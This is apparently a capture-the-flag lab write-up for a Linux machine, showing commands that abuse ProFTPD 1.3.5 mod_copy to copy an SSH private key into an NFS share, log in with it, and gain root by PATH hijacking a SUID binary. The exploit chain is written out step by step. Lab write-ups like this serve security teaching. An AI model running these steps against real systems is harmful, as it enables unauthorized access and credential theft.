## Summary

Linux machine exposing SMB, NFS, and FTP services. Initial access obtained by enumerating an anonymous SMB share which revealed a log file containing a ProFTPD 1.3.5 configuration and Kenobi's SSH key path. The mod_copy vulnerability in ProFTPD was abused to copy the SSH private key to the NFS mount, which was then retrieved and used to SSH in as kenobi. Privilege escalation achieved via PATH hijacking against a custom SUID binary.

## Exploitation

### ProFTPD 1.3.5 — mod_copy (CVE)

```bash
searchsploit proftpd 1.3.5
# → ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution
```

**Version confirmed:**

```bash
nc 10.114.145.154 21
# → 220 ProFTPD 1.3.5 Server
```

The `mod_copy` module allows unauthenticated file copy via `SITE CPFR/CPTO` commands. Used to copy Kenobi's SSH private key to the NFS-accessible `/var/tmp/` directory:

```bash
nc 10.114.145.154 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
# → 250 Copy successful
```

### NFS Mount — Retrieve SSH Key

```bash
mkdir /mnt/kenobiNFS
mount 10.114.145.154:/var /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa /root/
chmod 600 /root/id_rsa
```

### SSH Access

```bash
ssh -i /root/id_rsa kenobi@10.114.145.154
```

**Result:** Shell as `kenobi` ✅

## Privilege Escalation

### SUID Binary Enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Suspicious binary found:** `/usr/bin/menu` — non-standard SUID binary

### PATH Hijacking

`/usr/bin/menu` presents 3 options and calls system commands (curl, uname, ifconfig) without absolute paths → vulnerable to PATH hijacking.

```bash
cd /tmp
echo /bin/bash > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
# → Select option 1
```

**Result:** Root shell ✅

## Lessons Learned

**1.** Anonymous SMB shares can expose sensitive files like configuration logs and SSH key paths — always enumerate SMB with `smbclient` before moving to other services.

**2.** ProFTPD 1.3.5 mod_copy allows unauthenticated file copy via `SITE CPFR/CPTO` — combined with an exposed NFS share, this lets you retrieve any readable file on the system without credentials.

**3.** Always run `find / -perm -u=s -type f 2>/dev/null` after getting a shell — a custom SUID binary calling system commands without absolute paths is an instant root via PATH hijacking.
